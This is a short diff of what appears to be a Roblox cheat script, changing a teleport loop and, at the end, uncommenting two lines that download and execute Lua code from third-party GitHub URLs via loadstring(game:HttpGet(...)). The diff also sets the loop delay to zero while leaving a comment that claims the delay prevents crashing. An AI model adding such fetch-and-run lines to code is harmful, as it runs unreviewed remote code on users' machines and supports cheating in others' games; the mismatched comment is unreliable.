@@ -4940,14 +4940,14 @@ function teleportLoop()
         local player = game.Players.LocalPlayer
         if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
             -- Generate random coordinates in the range you mentioned
-            local newX = math.random(-999999999, 999999999)
-            local newY = math.random(-999999999, 999999999)
-            local newZ = math.random(-999999999, 999999999)
+            local newX = math.random(9999999, 9999999)
+            local newY = math.random(9999999, 9999999)
+            local newZ = math.random(9999999, 9999999)
 
             -- Apply the random teleport
             player.Character.HumanoidRootPart.CFrame = CFrame.new(newX, newY, newZ)
         end
-        task.wait(0.1)  -- Add a small delay to prevent crashing
+        task.wait(0)  -- Add a small delay to prevent crashing
     end
 end
 
@@ -5540,5 +5540,5 @@ end)
     --Library:SaveConfig()
 end
 end
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/bebepro/pastesense/refs/heads/main/pastesense"))()
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/flanchhh/AntiV2/refs/heads/main/Anti%20v2.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bebepro/pastesense/refs/heads/main/pastesense"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/flanchhh/AntiV2/refs/heads/main/Anti%20v2.lua"))();
